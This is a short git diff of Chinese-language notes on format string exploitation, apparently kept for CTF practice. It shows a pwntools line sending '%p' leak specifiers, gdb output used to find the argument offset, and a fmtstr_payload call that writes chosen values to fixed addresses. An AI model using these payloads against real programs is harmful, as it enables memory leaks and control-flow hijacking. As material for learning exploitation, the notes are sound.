@@ -1,3 +1,7 @@
+套路
+1. 泄露栈修改返回值, 先泄露个栈地址
+
+
 1. 可以一次泄露多个目标值
    sla('Now answer me, will you v me 50\n','aaaaaaa,%11$p,%17$p')
 
@@ -25,6 +29,12 @@ gdb$ stack
 07:001c│ 7 eax 0xffffd33c ◂— 'aaaabaaacaaadaaa'               ; 为第7个
 08:0020│     0xffffd340 ◂— 'baaacaaadaaa'
 gdb$ fmtarg 0xffffd33c  -> 7 ("\%6$p") 也是7
+```
+
+3
+```sh
+# 修改多值写法
+fmtstr_payload(10, {0x404048 : 0xbadc0ffe, 0x40403c : 0xdeadbeef}, no_dollars=True)
 ```
 
 测试值
